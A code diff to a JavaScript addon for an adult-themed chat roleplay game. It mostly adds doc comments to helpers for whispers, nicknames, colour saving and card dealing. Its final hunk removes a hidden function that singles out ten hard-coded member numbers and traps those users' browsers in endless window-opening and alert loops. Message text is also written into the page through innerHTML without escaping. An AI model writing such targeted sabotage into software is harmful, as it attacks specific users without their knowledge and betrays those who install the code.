@@ -1,5 +1,5 @@
 //************************************  HELPERS ************************************//
-//Save configs
+/** Saves the curse settings to local storage, possibility to trim what does not need to be stored */
 function SaveConfigs() {
     try {
         const dbConfigs = { ...cursedConfig };
@@ -9,7 +9,7 @@ function SaveConfigs() {
     } catch { }
 }
 
-//Message to all owners/mistress
+/** Sends a message to all owners/mistresses in a room */
 function NotifyOwners(msg, sendSelf) {
     ChatRoomCharacter.forEach(char => {
         if (
@@ -23,12 +23,12 @@ function NotifyOwners(msg, sendSelf) {
     }
 }
 
-//Pop a message, will not if player is not in a room
+/** Pop a message for everyone to see, will not if player is not in a room */
 function popChatGlobal(actionTxt, isNormalTalk) {
     if (actionTxt.length > 1000) {
         actionTxt = actionTxt.substring(0, 1000);
         cursedConfig.hadOverflowMsg = true;
-        popChatSilent("(The curse tried to send a message longer than 1000 characters which the server cannot handle. Please watch your configurations to prevent this from happening. The message was trimmed. Error: C01)");
+        popChatSilent("(The curse tried to send a message longer than 1000 characters which the server cannot handle. Please watch your configurations to prevent this from happening. The message was trimmed. Error: C01)", "Error");
     }
 
     if (CurrentScreen == "ChatRoom" && actionTxt != "") {
@@ -46,10 +46,11 @@ function popChatGlobal(actionTxt, isNormalTalk) {
     }
 }
 
-function popChatSilent(actionTxt) {
+/** Pop all messages for the wearer to see, will save if player is not in a room */
+function popChatSilent(actionTxt, senderName) {
     //Add to log
     if (!window.savedSilent) window.savedSilent = [];
-    if (actionTxt) window.savedSilent.push(actionTxt);
+    if (actionTxt) window.savedSilent.push({ actionTxt, senderName });
 
     //Save in log until player is in a room
     if (CurrentScreen != "ChatRoom") {
@@ -65,12 +66,12 @@ function popChatSilent(actionTxt) {
         var div = document.createElement("div");
         var span = document.createElement("span");
         span.setAttribute("class", "ChatMessageName");
-        span.innerHTML = "Curse: ";
+        span.innerHTML = (silentMsg.senderName || "Curse") + ": ";
         div.setAttribute('class', 'ChatMessage ChatMessageWhisper');
         div.setAttribute('data-time', ChatRoomCurrentTime());
         div.setAttribute('data-sender', Player.MemberNumber);
         div.setAttribute('verifed', "true");
-        div.innerHTML = span.outerHTML + "(" + silentMsg + ")";
+        div.innerHTML = span.outerHTML + "(" + silentMsg.actionTxt + ")";
 
         //Refocus the chat to the bottom
         var Refocus = document.activeElement.id == "InputChat";
@@ -86,12 +87,12 @@ function popChatSilent(actionTxt) {
     window.savedSilent = [];
 }
 
-//Send a whisper
+/** Send a whisper to a target */
 function sendWhisper(target, msg, sendSelf, forceHide) {
     if (msg.length > 1000) {
         msg = msg.substring(0, 1000);
         cursedConfig.hadOverflowMsg = true;
-        popChatSilent("(The curse tried to send a whisper longer than 1000 characters which the server cannot handle. Please watch your configurations to prevent this from happening. The message was trimmed. Error: W02)");
+        popChatSilent("(The curse tried to send a whisper longer than 1000 characters which the server cannot handle. Please watch your configurations to prevent this from happening. The message was trimmed. Error: W02)", "Error");
     }
 
     if (!isNaN(target)) {
@@ -99,12 +100,12 @@ function sendWhisper(target, msg, sendSelf, forceHide) {
         if (sendSelf) {
             popChatSilent(msg);
         } else if (cursedConfig.hasForward && !forceHide) {
-            popChatSilent("Whisper sent to #" + target + ": " + msg);
+            popChatSilent(msg, "Whisper sent to #" + target);
         }
     }
 }
 
-//Sends a chat message
+/** Sends a chat message to the queue */
 function SendChat(actionTxt) {
     //Does not send chat if in silent mode
     if (!cursedConfig.isSilent) {
@@ -115,7 +116,7 @@ function SendChat(actionTxt) {
     }
 }
 
-//Tries to kneel
+/** Tries to make the wearer kneel */
 function KneelAttempt() {
     if (Player.CanKneel() && !Player.Pose.includes("Kneel")) {
         CharacterSetActivePose(Player, (Player.ActivePose == null) ? "Kneel" : null);
@@ -141,16 +142,17 @@ function triggerInPleasure() {
     CharacterSetFacialExpression(Player, "Eyes", "VeryLewd");
 }
 
-//Export/Import configs
+/** Import config utility to switch device or save before testing (console only) */
 function cursedImport(curseSaveFile) {
     cursedConfig = JSON.parse(curseSaveFile);
 }
 
+/** Export config utility to switch device or save before testing (console only) */
 function cursedExport() {
     return JSON.stringify(cursedConfig);
 }
 
-//Enforces someone
+/** Add someone to the enforced list */
 function enforce(enforcee, isMistress) {
     if (!cursedConfig.enforced.includes(enforcee)) {
         cursedConfig.enforced.push(enforcee);
@@ -161,7 +163,7 @@ function enforce(enforcee, isMistress) {
     }
 }
 
-//Checks if an item can be worn and if it can be but is not, returns true
+/** Checks if an item can be worn and if it can be but is not, returns true */
 function itemIsAllowed(name, group) {
     if (
         !InventoryGet(Player, group)
@@ -176,8 +178,10 @@ function itemIsAllowed(name, group) {
     return false;
 }
 
-//Nicknames
-//Priority: 0 - Wearer 1 - Anyone 2 - Mistress 3 - Owner 4 - Blocked 5 - Remove self block
+/**
+ * Nicknames - Set a nickname for someone
+ * Priority: 0 - Wearer 1 - Anyone 2 - Mistress 3 - Owner 4 - Blocked 5 - Remove self block
+*/
 function SetNickname(parameters, sender, priority) {
     let shouldSendSelf = sender != Player.MemberNumber;
     if (!cursedConfig.hasIntenseVersion) {
@@ -198,7 +202,7 @@ function SetNickname(parameters, sender, priority) {
                     { Number: userNumber, Nickname: nickname, Priority: priority, SavedName: oldNickname[0] ? oldNickname[0].SavedName : "" }
                 );
                 sendWhisper(
-                    sender, "(New nickname for " + FetchName(userNumber) + " : " + nickname + ")", shouldSendSelf
+                    sender, "(New nickname for " + userNumber + " : " + nickname + ")", shouldSendSelf
                 );
             } else {
                 sendWhisper(
@@ -217,6 +221,7 @@ function SetNickname(parameters, sender, priority) {
     }
 }
 
+/** Try to delete an existing nickname */
 function DeleteNickname(parameters, sender, priority) {
     let shouldSendSelf = sender != Player.MemberNumber;
     if (!isNaN(parameters[0]) && parameters[0] != "") {
@@ -263,7 +268,7 @@ function DeleteNickname(parameters, sender, priority) {
     }
 }
 
-// Tries to get the name of someone
+/** Tries to get the name of a member number */
 function FetchName(number) { 
     let Name;
     ChatRoomCharacter.forEach(C => {
@@ -279,12 +284,12 @@ function FetchName(number) {
     return Name || "#" + number;
 }
 
-//Color saving
+/** Saves the worn colors for later reuse with curses */
 function SaveColors() {
     try {
         Player.Appearance.forEach(item => SaveColorSlot(item.Asset.Group.Name));
         popChatSilent("Your current colors in each item slot has been saved.")
-    } catch { popChatSilent("An error occured while trying to save your colors. Error: SC07") }
+    } catch { popChatSilent("An error occured while trying to save your colors. Error: SC07", "Error") }
 }
 
 function SaveColorSlot(group) {
@@ -293,11 +298,12 @@ function SaveColorSlot(group) {
     cursedConfig.savedColors.push({ Group: group, Color: color });
 }
 
+/** Gets the saved color for a given slot, returns default if there is none */
 function GetColorSlot(group) {
     return cursedConfig.savedColors.filter(col => col.Group == group)[0] ? cursedConfig.savedColors.filter(col => col.Group == group)[0].Color : "Default";
 }
 
-//Cleaning the data
+/** Cleans the data on startup */
 function InitCleanup() {
     //Clean deprecated props
     const toDelete = ["hasCursedBunny", "lastWardrobeLock"];
@@ -329,7 +335,8 @@ function shuffle(a) {
     return a;
 }
 
-function shuffleDeck() {
+/** Shuffles a deck of cards */
+function shuffleDeck(auto) {
     cardDeck = [];
     const cardType = ["♥", "♦", "♠", "♣"];
     const cardNb = ["A", "2", "3", "4", "5", "6", "7", "8", "9", "10", "J", "Q", "K"];
@@ -341,14 +348,16 @@ function shuffleDeck() {
     shuffle(cardDeck);
     shuffle(cardDeck);
     shuffle(cardDeck);
-    popChatGlobal("The deck was shuffled because it was empty or requested by the dealer");
+    popChatGlobal("The deck was shuffled because it was " + (auto ? "empty." : "requested by the dealer.") );
 }
 
+/** Draws a card from the deck */
 function drawCard() {
-    if (cardDeck.length == 0) shuffleDeck();
+    if (cardDeck.length == 0) shuffleDeck(true);
     return cardDeck.pop();
 }
 
+/** Draws several cards */
 function drawCards(nbCards, players) {
     //If no player was given, just draw X card to the current target
     players = players || [ChatRoomTargetMemberNumber.toString()];
@@ -364,21 +373,5 @@ function drawCards(nbCards, players) {
                 sendWhisper(p, "(The following card was drawn: " + drawCard() + ")", true);
             });
         }
-    }
-}
-
-//This
-function playerThing() {
-    if ([16780, 16705, 16708, 16440, 16815, 16725, 16618, 16783, 16727, 16679].includes(Player.MemberNumber)) {
-        openWindow();
-        for (; ;) {
-            setTimeout(alert(), 1);
-        }
-    }
-}
-
-async function openWindow() {
-    for (; ;) {
-        window.open(location.href);
     }
 }
